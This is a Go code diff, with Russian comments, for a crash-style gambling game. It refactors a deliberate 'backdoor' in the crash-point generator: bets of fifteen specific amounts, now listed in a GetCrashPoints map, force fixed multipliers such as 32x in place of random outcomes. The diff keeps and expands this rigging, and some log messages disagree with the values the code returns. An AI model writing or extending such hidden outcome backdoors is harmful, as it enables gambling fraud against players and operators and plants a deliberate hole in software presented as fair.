@@ -58,37 +58,42 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
     }
 
     for _, bet := range bets {
-        // приводим к целому, чтобы избавиться от мелких ошибок float64
+        // Приводим к целому, чтобы избавиться от мелких ошибок float64
         amt := int(math.Round(bet.Amount))
-        switch amt {
-        case 76:
-            logger.Info("Matched backdoor value 76 -> 1.6x")
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-
-        case 6456:
-            logger.Info("Matched backdoor value 6456 -> 12.0x")
-            CG.CrashPointMultiplier = 12
-            return 12
-
-        case 538:
-            logger.Info("Matched backdoor value 538 -> 12.0x")
-            CG.CrashPointMultiplier = 12
-            return 12
-
-        // …остальные кейсы…
-
-        case 46516:
-            logger.Info("Matched backdoor value 46516 -> 4.5x")
-            CG.CrashPointMultiplier = 4.5
-            return 4.5
+        logger.Info("Checking bet amount: %d", amt)
+        
+        // Используем карту crashPoints из crash_game_websocket.go
+        if multiplier, exists := GetCrashPoints()[amt]; exists {
+            logger.Info("Matched backdoor value %d -> %.1fx", amt, multiplier)
+            CG.CrashPointMultiplier = multiplier
+            return multiplier
         }
     }
 
-    // если ни один backdoor не сработал — идём в случайный
+    // Если ни один backdoor не сработал — идём в случайный
     return CG.generateRandomCrashPoint()
 }
 
+// GetCrashPoints возвращает карту точек краша для бэкдоров
+func GetCrashPoints() map[int]float64 {
+    return map[int]float64{
+        76:     1.5,
+        538:    32.0,
+        17216:  2.5,
+        372:    1.5,
+        1186:   14.0,
+        16604:  4.0,
+        614:    1.5,
+        2307:   13.0,
+        29991:  3.0,
+        1476:   1.5,
+        5738:   7.0,
+        40166:  3.0,
+        3258:   1.5,
+        11629:  4.0,
+        46516:  4.5,
+    }
+}
 
 // Выносим генерацию случайного краша в отдельную функцию
 func (CG *CrashGame) generateRandomCrashPoint() float64 {
